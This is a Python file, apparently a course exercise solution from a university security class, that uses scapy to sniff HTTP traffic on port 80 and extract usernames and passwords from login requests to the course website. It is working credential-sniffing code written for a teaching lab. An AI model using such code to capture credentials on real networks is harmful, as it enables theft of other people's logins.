import scapy.all as S
import urllib.parse as urlparse
from typing import Tuple


WEBSITE = 'infosec.cs.tau.ac.il'


def parse_packet(packet) -> Tuple[str]:
    """
    If the given packet is a login request to the course website, return the
    username and password as a tuple => ('123456789', 'opensesame'). Otherwise,
    return None.

    Notes:
    1. You can assume the entire HTTP request fits within one packet, and that
       both the username and password are non-empty for login requests (if any
       of the above assumptions fails, it's OK if you don't extract the
       user/password - but you must still NOT crash).
    2. Filter the course website using the `WEBSITE` constant from above. DO NOT
       use the server IP for the filtering (as our domain may point to different
       IPs later and your code should be reliable).
    3. Make sure you return a tuple, not a list.
    """
    bytes_packet = bytes(packet[S.TCP].payload)      # packet as bytes
    string_packet = bytes_packet.decode()            # packet as string
    parsed_url = urlparse.urlparse(string_packet)    # convert “relative URL” to an absolute URL given a “base URL"
    parsed_path = urlparse.parse_qs(parsed_url.path) # convert the relevant part of the payload_string
    if WEBSITE+"/2023/login" in string_packet:
        try:
            username = parsed_path["username"][0]
            password = parsed_path["password"][0]
            result = (username,password)
            return result
        
        except (KeyError, IndexError) as e:
            return None
    
    return None
    

def packet_filter(packet) -> bool:
    """
    Filter to keep only HTTP traffic (port 80) from any HTTP client to any
    HTTP server (not just the course website). This function should return
    `True` for packets that match the above rule, and `False` for all other
    packets.

    Notes:
    1. We are only keeping HTTP, while dropping HTTPS
    2. Traffic from the server back to the client should not be kept
    """
    # if the packet is in TCP protocol and port 80 (HTTP)
    if packet.haslayer(S.TCP) and packet.dport == 80: 
            return True
    else:
        return False


def main(args):
    # WARNING: DO NOT EDIT THIS FUNCTION!
    if '--help' in args:
        print('Usage: %s [<path/to/recording.pcapng>]' % args[0])

    elif len(args) < 2:
        # Sniff packets and apply our logic.
        S.sniff(lfilter=packet_filter, prn=parse_packet)

    else:
        # Else read the packets from a file and apply the same logic.
        for packet in S.rdpcap(args[1]):
            if packet_filter(packet):
                print(parse_packet(packet))


if __name__ == '__main__':
    import sys
    main(sys.argv)
